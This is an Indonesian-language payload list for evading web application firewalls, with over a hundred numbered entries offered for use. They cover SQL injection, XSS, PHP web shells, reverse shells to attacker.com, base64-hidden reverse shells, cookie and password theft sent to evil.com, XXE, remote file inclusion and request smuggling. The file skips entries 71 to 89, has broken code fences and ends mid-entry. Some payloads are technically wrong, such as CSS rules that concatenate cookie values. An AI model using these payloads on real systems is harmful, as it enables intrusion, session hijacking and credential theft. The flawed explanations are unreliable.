
---

## 📌 **Advanced Payload List for WAF/IDS Bypass**  
_File ini berisi payload tingkat lanjut yang dirancang untuk melewati deteksi WAF modern menggunakan teknik enkripsi, encoding, dan evasion terbaik._  

### **🛡️ 1. Multi-layered SQLi Bypass**  
```sql
' OR (SELECT CASE WHEN (1=1) THEN CAST((SELECT CONCAT(username, ':', password) FROM users LIMIT 1) AS INT) ELSE NULL END)='1'-- -
```
**📌 Teknik:**  
✅ Menggunakan CASE-WHEN untuk menghindari deteksi pola umum.  
✅ `CAST(... AS INT)` membantu menyamarkan payload sebagai angka.  

---

### **🛡️ 2. Triple URL Encoded SQL Injection**  
```sql
%2527%2520UNION%2520SELECT%25201%252C2%252C3%252C4%252C5%252C6%252Cgroup_concat(username,0x3a,password)%2520FROM%2520users--
```
**📌 Teknik:**  
✅ Payload di-encode 3x agar tidak dikenali filter standar.  
✅ Menggunakan `group_concat()` untuk mengambil semua data sekaligus.  

---

### **🛡️ 3. SQL Injection via JSON Bypass**  
```json
{
    "username": "admin' OR IF(LENGTH(database())>0, SLEEP(5), 0)-- -",
    "password": "dummy"
}
```
**📌 Teknik:**  
✅ Menggunakan JSON yang sering diabaikan WAF standar.  
✅ `IF(LENGTH(database())>0, SLEEP(5), 0)` untuk mendeteksi database tanpa mengembalikan output langsung.  

---

### **🛡️ 4. XSS via JavaScript Encoding**  
```html
<img src="x" onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='))">
```
**📌 Teknik:**  
✅ `atob()` melakukan Base64 decoding di sisi klien untuk menghindari deteksi langsung.  
✅ Bisa digunakan untuk mencuri cookie dengan stealth mode.  

---

### **🛡️ 5. Web Shell Upload dengan Magic Bytes & Null Byte Injection**  
```php
GIF89a;  
<?php system($_GET['cmd']); ?>\x00.jpg
```
**📌 Teknik:**  
✅ Menambahkan header `GIF89a;` agar WAF mendeteksi sebagai gambar, bukan skrip PHP.  
✅ Null byte (`\x00`) mengelabui filter ekstensi file.  

---

### **🛡️ 6. Header-Based Command Injection**  
```http
GET /vuln.php HTTP/1.1  
Host: target.com  
User-Agent: ; /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```
**📌 Teknik:**  
✅ Menyisipkan perintah dalam `User-Agent` untuk dieksekusi oleh server.  
✅ Menggunakan reverse shell untuk mendapatkan akses penuh.  

---

### **🛡️ 7. Time-Based Blind SQLi with WAF Evasion**  
```sql
' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)-- -
```
**📌 Teknik:**  
✅ Menggunakan PostgreSQL `pg_sleep(10)` untuk mendeteksi WAF tanpa output langsung.  
✅ Pola `CASE-WHEN` membuatnya lebih sulit dikenali.  

---

### **🛡️ 8. JSON XSS Injection with Unicode Evasion**  
```json
{
    "username": "admin<script>\u0061\u006C\u0065\u0072\u0074(1)</script>",
    "password": "test"
}
```
**📌 Teknik:**  
✅ Menyisipkan karakter unicode (`\u0061` → 'a', `\u006C` → 'l', dll.) untuk menghindari filter biasa.  
✅ Bisa digunakan untuk XSS di aplikasi yang menerima JSON input.  

---

### **🛡️ 9. WebSocket-Based WAF Bypass for XSS**  
```javascript
var ws = new WebSocket("wss://evil.com");  
ws.onopen = function() { ws.send(document.cookie); };
```
**📌 Teknik:**  
✅ Menyisipkan payload dalam WebSocket agar tidak terdeteksi di request HTTP biasa.  
✅ Berguna untuk serangan **DOM-based XSS** di browser modern.  

---

### **🛡️ 10. SQL Injection with Adaptive Encoding**  
```sql
' OR (SELECT CASE WHEN (ASCII(SUBSTRING(database(),1,1)) > 100) THEN SLEEP(5) ELSE SLEEP(0) END)-- -
```
**📌 Teknik:**  
✅ Menggunakan `ASCII(SUBSTRING())` untuk mengambil karakter database satu per satu tanpa men-trigger WAF.  
✅ Pola **adaptive** yang bisa dikombinasikan dengan **binary search** untuk mempercepat eksekusi.  

---

---

### **🛡️ 11. Advanced XOR-Encoded SQL Injection**  
```sql
' OR 1=1 XOR HEX(SELECT GROUP_CONCAT(username, ':', password) FROM users)-- -
```
**📌 Teknik:**  
✅ XOR digunakan untuk menyamarkan payload agar sulit dikenali.  
✅ `HEX()` mengubah output menjadi hexadecimal agar tidak terbaca langsung oleh WAF.  

---

### **🛡️ 12. CSS Injection for Data Exfiltration**  
```css
@import url("http://evil.com/steal.css?cookie=" + document.cookie);
```
**📌 Teknik:**  
✅ Menggunakan `@import` CSS untuk mengirim data ke server penyerang.  
✅ Bisa melewati WAF yang hanya memfilter request JavaScript.  

---

### **🛡️ 13. Multipart SQL Injection via HTTP POST**  
```http
POST /vuln.php HTTP/1.1  
Host: target.com  
Content-Type: multipart/form-data; boundary=----Payload  
Content-Length: 150  

------Payload  
Content-Disposition: form-data; name="username"  

admin' OR '1'='1  
------Payload--
```
**📌 Teknik:**  
✅ SQLi disisipkan dalam multipart request untuk menghindari filter WAF standar.  
✅ Bisa digunakan untuk bypass sistem validasi input berbasis JSON atau form.  

---

### **🛡️ 14. DNS-Based Data Exfiltration**  
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.evil.com\\data'))--
```
**📌 Teknik:**  
✅ Memanfaatkan DNS query sebagai metode ekstraksi data tanpa HTTP.  
✅ Bisa melewati firewall yang hanya memblokir HTTP/HTTPS.  

---

### **🛡️ 15. Encrypted Command Injection via Base64**  
```bash
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTE3LzQ0NDQgMD4mMQ==' | base64 -d | bash
```
**📌 Teknik:**  
✅ Payload dienkripsi dengan Base64 agar tidak mudah dideteksi.  
✅ Reverse shell akan dieksekusi setelah decoding.  

---

### **🛡️ 16. HTTP Smuggling Attack for WAF Bypass**  
```http
POST /vulnerable-endpoint HTTP/1.1  
Host: target.com  
Transfer-Encoding: chunked  

0  
GET /admin HTTP/1.1  
```
**📌 Teknik:**  
✅ Menyisipkan **HTTP request kedua dalam body request pertama**.  
✅ Bisa melewati WAF yang tidak memahami HTTP Smuggling.  

---

### **🛡️ 17. SSH Injection via Reverse Proxy Exploit**  
```bash
ssh -o ProxyCommand='curl -x socks5://127.0.0.1:9050 -H "User-Agent: $(cat /etc/passwd)" http://evil.com' user@target
```
**📌 Teknik:**  
✅ Memanfaatkan **ProxyCommand** untuk mengirim data sensitif melalui HTTP request.  
✅ Bisa digunakan untuk exfiltrasi password Linux dari `/etc/passwd`.  

---

### **🛡️ 18. Cross-Protocol Exploitation (SMTP Injection)**  
```http
MAIL FROM:<attacker@example.com>\r\n  
RCPT TO:<victim@example.com>\r\n  
DATA\r\n  
Subject: Exploiting WAF via SMTP\r\n  
<script>alert('XSS via email!')</script>\r\n  
.\r\n  
QUIT\r\n
```
**📌 Teknik:**  
✅ Memanfaatkan SMTP untuk menyisipkan payload XSS atau phishing dalam email.  
✅ Bisa melewati WAF yang hanya memfilter HTTP.  

---

### **🛡️ 19. JavaScript-Based SQL Injection with Dynamic Payload**  
```javascript
fetch('https://target.com/api/login', {  
  method: 'POST',  
  body: JSON.stringify({  
    username: "' OR 1=1--",  
    password: "any"  
  }),  
  headers: { "Content-Type": "application/json" }  
});
```
**📌 Teknik:**  
✅ Menggunakan JavaScript untuk mengirim SQLi secara dinamis.  
✅ Bisa melewati WAF yang hanya memfilter URL, bukan request API.  

---

### **🛡️ 20. Advanced Polyglot Payload for Maximum WAF Evasion**  
```html
<SCRIPT SRC=//evil.com/x.js></SCRIPT><SCRIPT>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='))</SCRIPT>
```
**📌 Teknik:**  
✅ **Polyglot** = kombinasi beberapa teknik bypass dalam satu payload.  
✅ `SRC=//evil.com/x.js` digunakan untuk mengunduh skrip eksternal.  
✅ `eval(atob(...))` untuk menjalankan XSS tanpa terlihat seperti script berbahaya.  

---

```md
---

### **🛡️ 21. HTTP Parameter Pollution (HPP) Attack**  
```http
GET /index.php?user=admin&user=attacker HTTP/1.1
```
**📌 Teknik:**  
✅ **HPP** = Memasukkan parameter ganda untuk mengecoh server.  
✅ `user=admin&user=attacker` menyebabkan perilaku tak terduga.  
✅ **Bypass WAF** dengan eksploitasi ketidakkonsistenan parsing parameter.  

---

### **🛡️ 22. SQL Injection via Case Manipulation**  
```sql
SeLeCt * FrOm users WHEre username='admin' AnD 1=1-- 
```
**📌 Teknik:**  
✅ **Case Manipulation SQLi** = Memanfaatkan SQL parser dengan huruf campuran.  
✅ `SeLeCt * FrOm` menghindari deteksi pola sederhana oleh WAF.  
✅ **Bypass WAF** dengan variasi huruf besar-kecil yang tidak dikenali filter.  

---

### **🛡️ 23. CSS Injection to Steal Data**  
```css
input[name="password"] { background-image: url("http://evil.com/log?data="+value); }
```
**📌 Teknik:**  
✅ **CSS Injection** = Mengekstrak data formulir melalui gaya CSS.  
✅ `background-image: url(...)` mengirim data ke server jahat.  
✅ **Bypass WAF** karena bukan kode JavaScript atau SQL.  

---

### **🛡️ 24. Web Cache Poisoning Attack**  
```http
GET /index.php?lang=<script>alert(1)</script> HTTP/1.1
```
**📌 Teknik:**  
✅ **Web Cache Poisoning** = Mengubah cache server untuk menyebarkan XSS.  
✅ `?lang=<script>alert(1)</script>` tersimpan dalam cache dan dieksekusi.  
✅ **Bypass WAF** dengan mengeksploitasi sistem caching yang lemah.  

---

### **🛡️ 25. LDAP Injection for Authentication Bypass**  
```ldap
admin)(|(uid=*))%00
```
**📌 Teknik:**  
✅ **LDAP Injection** = Mengeksploitasi otentikasi berbasis LDAP.  
✅ `(|(uid=*))` menyebabkan server mencocokkan semua pengguna.  
✅ **Bypass WAF** dengan sintaks unik yang jarang difilter.  

---

### **🛡️ 26. XXE (XML External Entity) Attack**  
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
**📌 Teknik:**  
✅ **XXE** = Mengakses file sistem melalui parsing XML.  
✅ `file:///etc/passwd` membaca data dari server target.  
✅ **Bypass WAF** dengan eksploitasi parser XML yang rentan.  

---

### **🛡️ 27. CRLF Injection for Log Manipulation**  
```http
GET /index.php?name=admin%0D%0ASet-Cookie: session=evil HTTP/1.1
```
**📌 Teknik:**  
✅ **CRLF Injection** = Menyisipkan header HTTP berbahaya.  
✅ `%0D%0A` = Karakter newline yang memisahkan header baru.  
✅ **Bypass WAF** dengan injeksi ke dalam log atau header HTTP.  

---

### **🛡️ 28. JavaScript Prototype Pollution Attack**  
```js
{}.__proto__.isAdmin = true;
```
**📌 Teknik:**  
✅ **Prototype Pollution** = Memodifikasi objek JavaScript global.  
✅ `__proto__.isAdmin = true;` membuat semua pengguna jadi admin.  
✅ **Bypass WAF** karena tidak terlihat seperti serangan standar.  

---

### **🛡️ 29. PHP Type Juggling for Authentication Bypass**  
```php
$passwordHash == "0"
```
**📌 Teknik:**  
✅ **Type Juggling** = Memanfaatkan kesalahan perbandingan PHP.  
✅ `"0" == "hashed_password"` bisa bernilai `true` jika tipe tidak diverifikasi.  
✅ **Bypass WAF** dengan mengeksploitasi kelemahan validasi tipe data.  

---

### **🛡️ 30. DNS Rebinding Attack**  
```js
<script> var i = new Image(); i.src="http://attacker.com/log?ip="+document.domain; </script>
```
**📌 Teknik:**  
✅ **DNS Rebinding** = Memanipulasi resolusi DNS untuk mengakses data internal.  
✅ `document.domain` mengungkap informasi situs ke penyerang.  
✅ **Bypass WAF** dengan mengandalkan teknik rekursif DNS.  

---
---

### **🛡️ 31. Time-Based SQL Injection with Conditional Execution**  
```sql
' OR IF(1=1, SLEEP(5), 0)-- -
```
**📌 Teknik:**  
✅ **Time-Based SQLi** = Mengeksploitasi waktu tunda eksekusi query.  
✅ `IF(1=1, SLEEP(5), 0)` menyebabkan penundaan jika kondisi terpenuhi.  
✅ **Bypass WAF** dengan menyembunyikan eksploit di dalam fungsi kondisional.  

---

### **🛡️ 32. JavaScript XSS via SVG File**  
```xml
<svg onload=alert(1)>
```
**📌 Teknik:**  
✅ **SVG XSS** = Menyisipkan payload dalam elemen gambar SVG.  
✅ `onload=alert(1)` memicu eksekusi JavaScript saat gambar dimuat.  
✅ **Bypass WAF** karena banyak filter hanya mendeteksi `<script>`.  

---

### **🛡️ 33. Double Encoding SQL Injection**  
```sql
%2527%2520OR%25201%253D1--%2520
```
**📌 Teknik:**  
✅ **Double Encoding** = Karakter khusus dikodekan dua kali.  
✅ `%2527` adalah `'` (kutip tunggal) setelah decoding ganda.  
✅ **Bypass WAF** dengan menyembunyikan payload di dalam encoding.  

---

### **🛡️ 34. XSS via Meta Refresh**  
```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```
**📌 Teknik:**  
✅ **Meta Refresh XSS** = Mengeksekusi JavaScript melalui redirect.  
✅ `http-equiv="refresh"` digunakan untuk memuat URL berbahaya.  
✅ **Bypass WAF** karena tidak mengandung `<script>`.  

---

### **🛡️ 35. Log Poisoning Attack via User-Agent**  
```http
User-Agent: <?php system($_GET['cmd']); ?>
```
**📌 Teknik:**  
✅ **Log Poisoning** = Menyuntikkan kode PHP ke dalam log server.  
✅ `system($_GET['cmd'])` memungkinkan eksekusi perintah shell.  
✅ **Bypass WAF** karena payload dikirim melalui header HTTP.  

---

### **🛡️ 36. Blind SQL Injection with Boolean Logic**  
```sql
' OR 1=1 AND 'a'='a'--
```
**📌 Teknik:**  
✅ **Blind SQLi** = Mengeksekusi SQLi tanpa melihat output langsung.  
✅ `1=1 AND 'a'='a'` memastikan kondisi selalu benar.  
✅ **Bypass WAF** dengan memanipulasi ekspresi boolean.  

---

### **🛡️ 37. Command Injection via Ping**  
```bash
ping -c 1 127.0.0.1; nc -e /bin/sh attacker.com 4444
```
**📌 Teknik:**  
✅ **Command Injection** = Mengeksploitasi shell untuk menjalankan perintah.  
✅ `nc -e /bin/sh attacker.com 4444` membuka reverse shell.  
✅ **Bypass WAF** dengan menyamarkan payload dalam perintah ping.  

---

### **🛡️ 38. HTML Injection via SVG Polyglot**  
```html
<svg><script>alert(1)</script></svg>
```
**📌 Teknik:**  
✅ **SVG Polyglot XSS** = Menggabungkan kode SVG dan JavaScript.  
✅ `<script>` dijalankan dalam konteks SVG.  
✅ **Bypass WAF** karena banyak filter tidak mendeteksi payload dalam SVG.  

---

### **🛡️ 39. Remote File Inclusion (RFI) via PHP**  
```php
?file=http://evil.com/shell.txt
```
**📌 Teknik:**  
✅ **RFI** = Memuat skrip berbahaya dari server eksternal.  
✅ `file=http://evil.com/shell.txt` menyisipkan kode berbahaya ke sistem target.  
✅ **Bypass WAF** dengan menyamarkan payload sebagai parameter file.  

---

### **🛡️ 40. JSON Bypass SQL Injection**  
```json
{"username":"admin' OR '1'='1","password":"any"}
```
**📌 Teknik:**  
✅ **JSON SQLi** = Menyuntikkan SQLi melalui API JSON.  
✅ `' OR '1'='1` mengeksploitasi otentikasi berbasis SQL.  
✅ **Bypass WAF** karena banyak filter tidak menganalisis payload JSON.  

---
```md
---

### **🛡️ 41. Advanced Obfuscated SQL Injection**  
```sql
SELECT /*!12345 1*/ FROM users WHERE username='admin' /*!12345 AND*/ password='password'
```
**📌 Teknik:**  
✅ **Obfuscation SQLi** = Memanfaatkan komentar khusus MySQL (`/*!12345 */`).  
✅ **Bypass WAF** dengan menyembunyikan sintaks SQL dalam komentar yang valid.  

---

### **🛡️ 42. DOM-based XSS via JavaScript Injection**  
```js
document.write('<img src="http://attacker.com/log?cookie='+document.cookie+'">');
```
**📌 Teknik:**  
✅ **DOM-based XSS** = Mengeksploitasi JavaScript langsung di browser korban.  
✅ `document.cookie` mengirimkan data sensitif ke server penyerang.  
✅ **Bypass WAF** dengan eksploitasi manipulasi DOM.  

---

### **🛡️ 43. Blind XPath Injection Attack**  
```xml
/users/user[username/text()='admin' and substring(password,1,1)='a']
```
**📌 Teknik:**  
✅ **XPath Injection** = Mengeksploitasi kueri XML untuk mendapatkan kredensial.  
✅ **Bypass WAF** karena mirip dengan kueri valid dan tidak selalu terdeteksi.  

---

### **🛡️ 44. Host Header Poisoning for SSRF**  
```http
GET / HTTP/1.1
Host: internal-api.com
X-Forwarded-Host: attacker.com
```
**📌 Teknik:**  
✅ **Host Header Injection** = Memanipulasi `X-Forwarded-Host` untuk mengakses API internal.  
✅ **Bypass WAF** dengan menyalahgunakan parsing header HTTP.  

---

### **🛡️ 45. JavaScript Unicode Escape XSS**  
```js
\u0065\u0076\u0061\u006c('alert(1)')
```
**📌 Teknik:**  
✅ **Unicode Escape XSS** = Menyembunyikan karakter berbahaya dalam Unicode.  
✅ **Bypass WAF** karena terlihat seperti teks biasa bagi filter sederhana.  

---

### **🛡️ 46. PHP Filter Chain Bypass for RCE**  
```php
php://filter/convert.base64-encode/resource=index.php
```
**📌 Teknik:**  
✅ **PHP Filter Chain** = Mengeksploitasi wrapper `php://filter` untuk membaca file.  
✅ **Bypass WAF** dengan eksploitasi fitur bawaan PHP.  

---

### **🛡️ 47. JavaScript RegEx-based Payload Execution**  
```js
eval(/alert(1)/.source)
```
**📌 Teknik:**  
✅ **RegEx-based Execution** = Menyembunyikan `alert(1)` dalam ekspresi reguler.  
✅ **Bypass WAF** dengan metode unik dalam eksekusi kode JavaScript.  

---

### **🛡️ 48. HTTP Smuggling with Content-Length Manipulation**  
```http
POST / HTTP/1.1
Host: victim.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```
**📌 Teknik:**  
✅ **HTTP Smuggling** = Mengecoh server dengan header bertentangan (`Content-Length` vs `Transfer-Encoding`).  
✅ **Bypass WAF** dengan menyisipkan permintaan tersembunyi.  

---

### **🛡️ 49. WebSockets Hijacking Attack**  
```js
var socket = new WebSocket("wss://victim.com");
socket.onopen = function() { socket.send("evil_payload"); };
```
**📌 Teknik:**  
✅ **WebSockets Hijacking** = Mengeksploitasi komunikasi real-time untuk serangan injeksi.  
✅ **Bypass WAF** karena tidak semua sistem memantau lalu lintas WebSockets.  

---

### **🛡️ 50. Blind Base64 Command Injection**  
```bash
echo "bHMgL2V0Yy9wYXNzd2Q=" | base64 -d | sh
```
**📌 Teknik:**  
✅ **Base64 Injection** = Menyembunyikan perintah berbahaya dalam encoding Base64.  
✅ **Bypass WAF** karena tidak terlihat seperti perintah eksplisit.  

---
```

```md
---

### **🛡️ 51. Advanced Polyglot XSS Payload**  
```html
"><script>eval(atob('YWxlcnQoMSk=</script>'))
```
**📌 Teknik:**  
✅ **Polyglot XSS** = Kombinasi beberapa teknik bypass dalam satu payload.  
✅ **Bypass WAF** dengan memanfaatkan `atob()` untuk menghindari deteksi.  

---

### **🛡️ 52. Parameter Pollution for SQLi Bypass**  
```http
GET /search?query=admin&query=' OR '1'='1' --
```
**📌 Teknik:**  
✅ **HTTP Parameter Pollution** = Menggunakan parameter duplikat untuk mengelabui filter.  
✅ **Bypass WAF** karena sebagian besar hanya memeriksa parameter pertama.  

---

### **🛡️ 53. DNS Rebinding for Remote Access**  
```js
var img = new Image();
img.src = "http://evil.com?dns="+document.domain;
```
**📌 Teknik:**  
✅ **DNS Rebinding** = Mengeksploitasi resolusi DNS untuk melewati SOP (Same-Origin Policy).  
✅ **Bypass WAF** dengan menyalahgunakan domain yang sah.  

---

### **🛡️ 54. Nested SQL Injection Bypass**  
```sql
SELECT * FROM users WHERE username='admin' AND password=(SELECT password FROM users WHERE username='admin')
```
**📌 Teknik:**  
✅ **Nested Queries** = Memanfaatkan subquery dalam SQL Injection.  
✅ **Bypass WAF** karena terlihat seperti kueri SQL biasa.  

---

### **🛡️ 55. CSS Injection to Steal Credentials**  
```css
input[type="password"] { background: url("http://evil.com/log?pwd="+value); }
```
**📌 Teknik:**  
✅ **CSS Injection** = Mengeksploitasi style untuk mencuri input user.  
✅ **Bypass WAF** karena hanya terlihat seperti aturan CSS biasa.  

---

### **🛡️ 56. PHP Wrappers for RCE**  
```php
php://filter/convert.base64-encode/resource=/etc/passwd
```
**📌 Teknik:**  
✅ **PHP Wrappers** = Menggunakan filter PHP untuk membaca file sistem.  
✅ **Bypass WAF** karena tidak menggunakan fungsi eksplisit seperti `file_get_contents()`.  

---

### **🛡️ 57. Exif Metadata PHP Injection**  
```php
<?php $cmd="ls"; echo shell_exec($cmd); ?>
```
**📌 Teknik:**  
✅ **Exif Injection** = Menyisipkan kode PHP dalam metadata gambar.  
✅ **Bypass WAF** karena payload tersembunyi dalam metadata file.  

---

### **🛡️ 58. XML External Entity (XXE) Attack**  
```xml
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<data>&file;</data>
```
**📌 Teknik:**  
✅ **XXE Attack** = Mengeksploitasi parser XML untuk membaca file sensitif.  
✅ **Bypass WAF** karena format XML terlihat valid.  

---

### **🛡️ 59. JavaScript Event Handler XSS**  
```html
<img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">
```
**📌 Teknik:**  
✅ **Event-based XSS** = Mengeksploitasi atribut event seperti `onerror`.  
✅ **Bypass WAF** karena payload tersimpan dalam atribut HTML.  

---

### **🛡️ 60. GraphQL Injection**  
```graphql
{
  user(id: "1' OR '1'='1") {
    id
    username
    password
  }
}
```
**📌 Teknik:**  
✅ **GraphQL Injection** = Mengeksploitasi query GraphQL untuk bypass autentikasi.  
✅ **Bypass WAF** karena menggunakan sintaks GraphQL yang sah.  

---

### **🛡️ 61. JavaScript Prototype Pollution for RCE**  
```js
Object.prototype.constructor.constructor('alert(1)')();
```
**📌 Teknik:**  
✅ **Prototype Pollution** = Mengeksploitasi manipulasi objek bawaan JavaScript.  
✅ **Bypass WAF** dengan teknik non-tradisional.  

---

### **🛡️ 62. HTTP Request Smuggling via Content-Length Trick**  
```http
POST / HTTP/1.1
Host: victim.com
Content-Length: 10

GET /admin HTTP/1.1
```
**📌 Teknik:**  
✅ **HTTP Smuggling** = Memanipulasi header untuk menyembunyikan permintaan ilegal.  
✅ **Bypass WAF** dengan mengelabui parsing HTTP.  

---

### **🛡️ 63. NoSQL Injection Bypass via Regex Query**  
```json
{"username": {"$regex": ".*"}, "password": {"$ne": ""}}
```
**📌 Teknik:**  
✅ **NoSQL Injection** = Mengeksploitasi MongoDB dengan regex query.  
✅ **Bypass WAF** karena terlihat seperti query JSON biasa.  

---

### **🛡️ 64. CSS Keylogger via Animation Exploit**  
```css
@keyframes x{0%{background:url('http://evil.com?key='+document.activeElement.value)}}
```
**📌 Teknik:**  
✅ **CSS Keylogger** = Menggunakan animasi CSS untuk mencuri input pengguna.  
✅ **Bypass WAF** karena hanya terlihat seperti CSS biasa.  

---

### **🛡️ 65. JSONP Hijacking for Data Theft**  
```html
<script src="http://victim.com/api?callback=stealData"></script>
```
**📌 Teknik:**  
✅ **JSONP Hijacking** = Mengeksploitasi JSONP untuk mencuri data.  
✅ **Bypass WAF** dengan menggunakan metode callback JSONP.  

---

### **🛡️ 66. Remote File Inclusion via PHP Wrappers**  
```php
<?php include 'php://input'; ?>
```
**📌 Teknik:**  
✅ **RFI Attack** = Memasukkan file dari input eksternal ke dalam kode PHP.  
✅ **Bypass WAF** karena tidak menggunakan URL eksplisit.  

---

### **🛡️ 67. Subdomain Takeover via CNAME Misconfiguration**  
```bash
dig sub.victim.com CNAME
```
**📌 Teknik:**  
✅ **Subdomain Takeover** = Mengeksploitasi DNS yang salah konfigurasi.  
✅ **Bypass WAF** karena memanfaatkan kesalahan konfigurasi, bukan payload eksplisit.  

---

### **🛡️ 68. Log Injection for Code Execution**  
```bash
echo "<?php system('ls'); ?>" >> /var/log/auth.log
```
**📌 Teknik:**  
✅ **Log Injection** = Menyisipkan kode PHP dalam log server untuk dieksekusi.  
✅ **Bypass WAF** karena payload tersembunyi dalam file log.  

---

### **🛡️ 69. CSRF via SVG File Injection**  
```xml
<svg onload="fetch('http://evil.com?cookie='+document.cookie)">
```
**📌 Teknik:**  
✅ **SVG-based CSRF** = Menggunakan elemen SVG untuk mencuri data.  
✅ **Bypass WAF** karena SVG dianggap aman oleh banyak sistem.  

---

### **🛡️ 70. JWT None Algorithm Bypass**  
```json
{
  "alg": "none",
  "typ": "JWT"
}
```
**📌 Teknik:**  
✅ **JWT Algorithm Confusion** = Menggunakan algoritma `none` untuk memalsukan token.  
✅ **Bypass WAF** karena payload tampak seperti token JWT biasa.  

---
```

```md
---

### **🛡️ 90. XSS via Mutation Observer**  
```js
let observer = new MutationObserver((m) => eval(m[0].addedNodes[0].data));
document.body.appendChild(document.createElement("script")).innerHTML = "alert('Hacked')";
```
**📌 Teknik:**  
✅ **Mutation Observer** = Mengeksekusi JavaScript saat elemen DOM berubah.  
✅ **Bypass WAF** karena payload tidak langsung muncul dalam HTML awal.  

---

### **🛡️ 91. Advanced SQL Injection via Batched Queries**  
```sql
SELECT * FROM users WHERE id=1; DROP TABLE users; --
```
**📌 Teknik:**  
✅ **Batched Queries** = Menjalankan lebih dari satu query dalam satu perintah SQL.  
✅ **Bypass WAF** karena banyak filter hanya memeriksa satu query per input.  

---

### **🛡️ 92. File Upload Bypass using Double Extension**  
```php
shell.php%00.jpg
```
**📌 Teknik:**  
✅ **Double Extension** = Mengelabui sistem agar menerima file PHP sebagai gambar.  
✅ **Bypass WAF** karena beberapa filter hanya memeriksa ekstensi akhir `.jpg`.  

---

### **🛡️ 93. HTTP Parameter Pollution (HPP) Attack**  
```http
GET /index.php?user=admin&user=hacker
```
**📌 Teknik:**  
✅ **HPP Attack** = Mengirim parameter yang sama dua kali untuk membingungkan backend.  
✅ **Bypass WAF** karena filter hanya membaca satu parameter.  

---

### **🛡️ 94. Remote Code Execution (RCE) via Log Injection**  
```bash
echo '<?php system($_GET["cmd"]); ?>' >> /var/log/auth.log
```
**📌 Teknik:**  
✅ **Log Injection** = Memasukkan kode ke dalam log yang nanti akan dieksekusi oleh PHP.  
✅ **Bypass WAF** karena payload hanya tersimpan di log awalnya.  

---

### **🛡️ 95. Host Header Attack for Privilege Escalation**  
```http
GET /admin HTTP/1.1
Host: internal.victim.com
```
**📌 Teknik:**  
✅ **Host Header Attack** = Mengubah `Host` untuk mengakses area internal server.  
✅ **Bypass WAF** karena terlihat seperti request normal.  

---

### **🛡️ 96. Clickjacking via Hidden Frame Overlay**  
```html
<iframe src="http://victim.com" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
```
**📌 Teknik:**  
✅ **Clickjacking** = Memanfaatkan iframe transparan untuk mencuri klik pengguna.  
✅ **Bypass WAF** karena terjadi di level UI, bukan HTTP request.  

---

### **🛡️ 97. Advanced WAF Bypass with Time-Based SQL Injection**  
```sql
SELECT IF(1=1, SLEEP(5), 0)
```
**📌 Teknik:**  
✅ **Time-Based Injection** = Mengeksploitasi waktu respons server untuk mendapatkan data.  
✅ **Bypass WAF** karena payload tidak mengandung karakter SQL berbahaya secara eksplisit.  

---

### **🛡️ 98. NTLM Hash Capture via UNC Path Injection**  
```html
<img src="file://evil.com/hack.png">
```
**📌 Teknik:**  
✅ **UNC Path Injection** = Memaksa browser mengirim NTLM hash ke server penyerang.  
✅ **Bypass WAF** karena berbasis protokol file, bukan HTTP.  

---

### **🛡️ 99. DNS Rebinding Attack for Local Network Exploitation**  
```js
<script>location.hostname = "attacker.com";</script>
```
**📌 Teknik:**  
✅ **DNS Rebinding** = Mengelabui browser untuk mengakses server lokal dari domain jahat.  
✅ **Bypass WAF** karena serangan terjadi melalui DNS, bukan request langsung.  

---

### **🛡️ 100. JavaScript Prototype Pollution Exploit**  
```js
Object.prototype.admin = true;
```
**📌 Teknik:**  
✅ **Prototype Pollution** = Mengubah objek global untuk mengubah logika aplikasi.  
✅ **Bypass WAF** karena tidak terlihat seperti payload serangan langsung.  

---

### **🛡️ 101. HTML Injection via SVG XSS**  
```html
<svg onload="alert('XSS')"></svg>
```
**📌 Teknik:**  
✅ **SVG XSS** = Mengeksploitasi tag `<svg>` untuk menjalankan JavaScript.  
✅ **Bypass WAF** karena beberapa filter tidak menangani SVG dengan baik.  

---

### **🛡️ 102. Reflected XSS via Open Graph Metadata**  
```html
<meta property="og:title" content='"><script>alert(1)</script>'>
```
**📌 Teknik:**  
✅ **OG Metadata XSS** = Menyisipkan skrip dalam tag Open Graph (`<meta>`).  
✅ **Bypass WAF** karena payload tidak berada dalam body HTML utama.  

---

### **🛡️ 103. Blind SSRF using Out-of-Band (OOB) Channel**  
```http
GET /api?url=http://evil.com/callback
```
**📌 Teknik:**  
✅ **Blind SSRF** = Menggunakan request ke domain eksternal untuk mengekstrak informasi.  
✅ **Bypass WAF** karena hanya terlihat seperti request biasa ke API.  

---

### **🛡️ 104. JavaScript Cookie Theft via document.cookie**  
```js
fetch("http://evil.com/log?cookie=" + document.cookie);
```
**📌 Teknik:**  
✅ **Cookie Theft** = Mengirimkan cookie pengguna ke server penyerang.  
✅ **Bypass WAF** karena kode JavaScript ini sering digunakan secara sah.  

---

### **🛡️ 105. File Inclusion Exploit with Remote Payload Execution**  
```php
<?php include("http://evil.com/shell.php"); ?>
```
**📌 Teknik:**  
✅ **Remote File Inclusion (RFI)** = Menjalankan kode dari server penyerang.  
✅ **Bypass WAF** dengan memanfaatkan fitur `include()` di PHP.  

---

### **🛡️ 106. Path Traversal via Null Byte Injection**  
```http
GET /download?file=../../etc/passwd%00.png
```
**📌 Teknik:**  
✅ **Path Traversal** = Mengakses file sistem dengan manipulasi path.  
✅ **Bypass WAF** karena filter sering hanya memeriksa ekstensi akhir `.png`.  

---

### **🛡️ 107. JavaScript Eval Injection via JSON Hijacking**  
```json
{"payload": "eval('alert(1)')"}
```
**📌 Teknik:**  
✅ **JSON Hijacking** = Mengeksploitasi JSON yang tidak tervalidasi dengan benar.  
✅ **Bypass WAF** karena payload tampak seperti objek JSON biasa.  

---

### **🛡️ 108. Remote Command Execution via Malicious SSH Key**  
```bash
